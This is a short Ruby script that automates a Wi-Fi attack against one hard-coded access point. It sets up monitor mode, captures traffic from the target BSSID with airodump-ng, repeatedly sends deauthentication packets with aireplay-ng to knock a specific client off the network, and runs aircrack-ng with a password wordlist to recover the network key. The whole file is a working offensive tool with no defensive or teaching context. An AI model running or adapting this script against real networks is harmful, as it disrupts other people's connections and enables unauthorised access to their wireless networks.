require './airmon_parser.rb'
require './monitoring_starter.rb'
require './monitoring_stopper.rb'
require './cleaner.rb'

cleaner()
# Deletes trash files, that were left from previous runs

monitoring_stopper(airmon_parser)
# ^ stops all mons and wlans, ensuring mon0 will be free

monitoring_starter(airmon_parser)
# Starts mon0 for the chosen wlan

again = true

while again do
	
	again = false	
	cleaner()
	# Deletes all iv-s and txt-s
	
	p = IO.popen("sudo airodump-ng mon0 --bssid 00:1D:7E:FB:38:80 -c 11 -w replay --ivs")


	fork do 
		sleep(0.5)
		2.times do
			if !system("sudo aireplay-ng -0 1 -a 00:1D:7E:FB:38:80 -c 1C:65:9D:0C:FE:02 mon0")
				monitoring_stopper()
				cleaner()
				abort("\nAttack fail!")
			end
			sleep(2)
		end
	end


	pid = p.pid
	n = 5
	sleep(n)
	Process.kill("INT", pid)

	if !system("sudo aircrack-ng -w pass.lst replay-01.ivs")
		abort("\nCracker fail!")
	else
		a = `sudo aircrack-ng -w pass.lst replay-01.ivs`
	end
	
	if a =~ /no data packets/
		again = true
	end

end

monitoring_stopper(airmon_parser)
# Stops all mons and wlans

cleaner()
# Deletes all iv-s and txt-s

